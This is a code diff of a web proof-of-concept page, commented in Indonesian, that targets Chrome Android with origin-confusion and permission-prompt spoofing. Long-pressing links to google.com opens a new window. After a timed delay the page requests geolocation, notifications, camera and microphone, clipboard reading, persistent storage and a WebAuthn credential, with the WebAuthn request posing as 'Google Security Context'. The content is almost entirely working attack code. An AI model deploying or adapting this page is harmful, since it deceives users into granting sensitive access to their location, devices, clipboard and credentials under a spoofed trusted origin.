@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Origin Spoofing & Geolocation Permission PoC</title>
+    <title>Advanced Browser APIs & Race Condition Spoofing PoC</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -29,24 +29,26 @@
         h1 {
             font-size: 18px;
             color: #ffffff;
-            margin-bottom: 24px;
+            margin-bottom: 20px;
         }
         .container {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
             width: 100%;
-            max-width: 380px;
+            max-width: 400px;
         }
         a.spoof-link {
-            display: inline-block;
+            display: block;
             background-color: #da3633;
             color: white;
-            padding: 16px 24px;
+            padding: 12px 18px;
             text-decoration: none;
             font-weight: 600;
-            font-size: 15px;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(218, 54, 51, 0.4);
+            font-size: 13px;
+            border-radius: 6px;
+            box-shadow: 0 4px 10px rgba(218, 54, 51, 0.3);
             transition: background-color 0.2s, transform 0.1s;
-            width: 100%;
             box-sizing: border-box;
         }
         a.spoof-link:active {
@@ -54,21 +56,23 @@
             transform: scale(0.98);
         }
         .file-info {
-            margin-top: 20px;
-            font-size: 13px;
+            margin-top: 15px;
+            font-size: 12px;
             color: #8b949e;
             word-break: break-all;
             background: #161b22;
-            padding: 12px;
+            padding: 10px;
             border-radius: 6px;
-            width: 85%;
-            max-width: 400px;
+            width: 90%;
+            max-width: 420px;
             border: 1px solid #30363d;
             text-align: left;
             font-family: monospace;
+            max-height: 120px;
+            overflow-y: auto;
         }
         .footer-note {
-            margin-top: 25px;
+            margin-top: 15px;
             font-size: 11px;
             color: #484f58;
         }
@@ -76,69 +80,110 @@
 </head>
 <body>
 
-    <div class="banner">Origin Spoofing Research Lab</div>
-    <h1>Multi-Window Context & Geolocation Prompt</h1>
+    <div class="banner">Race Condition & API Fuzzing Lab</div>
+    <h1>Multi-API Browser Permission Spoofing PoC</h1>
 
     <div class="container">
-        <!-- Tombol Utama dengan Target Google.com di Atas & Pemicu Permission Spoofing di Bawah -->
-        <a href="https://www.google.com" class="spoof-link" id="masterBtn">
-            Open Window & Request Location Permission
-        </a>
+        <!-- Kumpulan Tombol Berbasis Berbagai API Browser Sensitif -->
+        <a href="https://www.google.com" class="spoof-link" data-api="geolocation">Open Window & Race Geolocation API</a>
+        <a href="https://www.google.com" class="spoof-link" data-api="notifications">Open Window & Race Notifications API</a>
+        <a href="https://www.google.com" class="spoof-link" data-api="media">Open Window & Race Camera/Microphone API</a>
+        <a href="https://www.google.com" class="spoof-link" data-api="clipboard">Open Window & Race Clipboard API</a>
+        <a href="https://www.google.com" class="spoof-link" data-api="storage">Open Window & Race Persistent Storage API</a>
+        <a href="https://www.google.com" class="spoof-link" data-api="webauthn">Open Window & Race WebAuthn Credential API</a>
     </div>
 
-    <div class="file-info" id="fileInfo">Status: Ready. Long-press the button and select "Open in new window".</div>
-    <div class="footer-note">Target: Origin Context Confusion & Sensitive Permission Prompt.</div>
+    <div class="file-info" id="fileInfo">Status: Ready. Long-press any button and select "Open in new window".</div>
+    <div class="footer-note">Target: Asynchronous Race Condition & Origin Context Confusion.</div>
 
     <script>
         let isExecuting = false;
 
-        const triggerOriginSpoofVector = () => {
+        const executeRaceConditionVector = (apiType) => {
             if (isExecuting) return;
             isExecuting = true;
 
             const infoBox = document.getElementById("fileInfo");
-            infoBox.innerHTML = `[+] Multi-window split initiated.<br>[*] Synchronizing origin context prompt...`;
+            infoBox.innerHTML = `[+] Race condition initiated for [${apiType}].<br>[*] Synchronizing parallel execution threads...`;
 
-            // Jeda waktu 2400ms agar jendela atas (google.com) terbuka sempurna dan membingungkan konteks asal
+            // Jeda waktu presisi (2200ms - 2400ms) untuk mengadu kecepatan render panel atas (google.com) 
+            // dengan eksekusi pemicu API di panel bawah agar terjadi kebingungan konteks origin.
             setTimeout(() => {
+                infoBox.innerHTML = `[⚡ RACE TRIGGER] Dispatched API request under competing origin context!`;
+
                 try {
-                    infoBox.innerHTML = `[+] Requesting high-accuracy geolocation under spoofed origin context...`;
-                    
-                    // Memanggil Geolocation API secara langsung untuk memicu dialog izin (Permission Prompt) sistem
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(
-                            (position) => {
-                                infoBox.innerHTML = `[+] Location acquired successfully:<br>Lat: ${position.coords.latitude}, Lng: ${position.coords.longitude}`;
-                            },
-                            (error) => {
-                                infoBox.innerHTML = `[-] Permission prompt handled / denied: ${error.message}`;
-                            },
-                            {
-                                enableHighAccuracy: true,
-                                timeout: 10000,
-                                maximumAge: 0
+                    switch (apiType) {
+                        case 'geolocation':
+                            navigator.geolocation.getCurrentPosition(
+                                (pos) => infoBox.innerHTML += `<br>[+] Geolocation granted: Lat ${pos.coords.latitude}`,
+                                (err) => infoBox.innerHTML += `<br>[-] Geolocation error/blocked: ${err.message}`,
+                                { timeout: 5000 }
+                            );
+                            break;
+
+                        case 'notifications':
+                            Notification.requestPermission().then((perm) => {
+                                infoBox.innerHTML += `<br>[+] Notification permission state: ${perm}`;
+                            });
+                            break;
+
+                        case 'media':
+                            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                                .then((stream) => {
+                                    infoBox.innerHTML += `<br>[+] Media stream acquired successfully.`;
+                                    stream.getTracks().forEach(track => track.stop());
+                                })
+                                .catch((err) => infoBox.innerHTML += `<br>[-] Media blocked: ${err.message}`);
+                            break;
+
+                        case 'clipboard':
+                            navigator.clipboard.readText()
+                                .then((text) => infoBox.innerHTML += `<br>[+] Clipboard read: ${text.substring(0, 20)}...`)
+                                .catch((err) => infoBox.innerHTML += `<br>[-] Clipboard restricted: ${err.message}`);
+                            break;
+
+                        case 'storage':
+                            if (navigator.storage && navigator.storage.persist) {
+                                navigator.storage.persist().then((persistent) => {
+                                    infoBox.innerHTML += `<br>[+] Persistent storage granted: ${persistent}`;
+                                });
                             }
-                        );
-                    } else {
-                        infoBox.innerHTML = `[-] Geolocation API not supported in this context.`;
+                            break;
+
+                        case 'webauthn':
+                            if (window.PublicKeyCredential) {
+                                const publicKey = {
+                                    challenge: new Uint8Array([1,2,3,4,5,6,7,8]),
+                                    rp: { name: "Google Security Context" },
+                                    user: { id: new Uint8Array([1]), name: "user@google.com", displayName: "Target User" },
+                                    pubKeyCredParams: [{ alg: -7, type: "public-key" }],
+                                    timeout: 30000
+                                };
+                                navigator.credentials.create({ publicKey })
+                                    .then(() => infoBox.innerHTML += `<br>[+] WebAuthn credential prompt executed.`)
+                                    .catch((err) => infoBox.innerHTML += `<br>[-] WebAuthn trapped: ${err.message}`);
+                            }
+                            break;
                     }
-                } catch (err) {
-                    infoBox.innerHTML = `[-] Execution trapped: ${err.message}`;
-                    console.debug("Origin spoof vector error:", err.message);
+                } catch (e) {
+                    infoBox.innerHTML += `<br>[-] Exception: ${e.message}`;
                 } finally {
                     setTimeout(() => { isExecuting = false; }, 2000);
                 }
-            }, 2400);
+            }, 2300);
         };
 
-        const masterElement = document.getElementById("masterBtn");
-        
-        // Menangkap aksi long-press (contextmenu) pada Chrome Android
-        masterElement.addEventListener("contextmenu", (e) => {
-            triggerOriginSpoofVector();
+        // Memasang event listener ke seluruh tombol API
+        document.querySelectorAll('.spoof-link').forEach(link => {
+            const apiType = link.getAttribute('data-api');
+            
+            // Menangkap long-press (contextmenu) pada Chrome Android
+            link.addEventListener('contextmenu', (e) => {
+                executeRaceConditionVector(apiType);
+            });
+            
+            link.addEventListener('touchstart', () => {}, { passive: true });
         });
-        
-        masterElement.addEventListener("touchstart", () => {}, { passive: true });
     </script>
 
 </body>
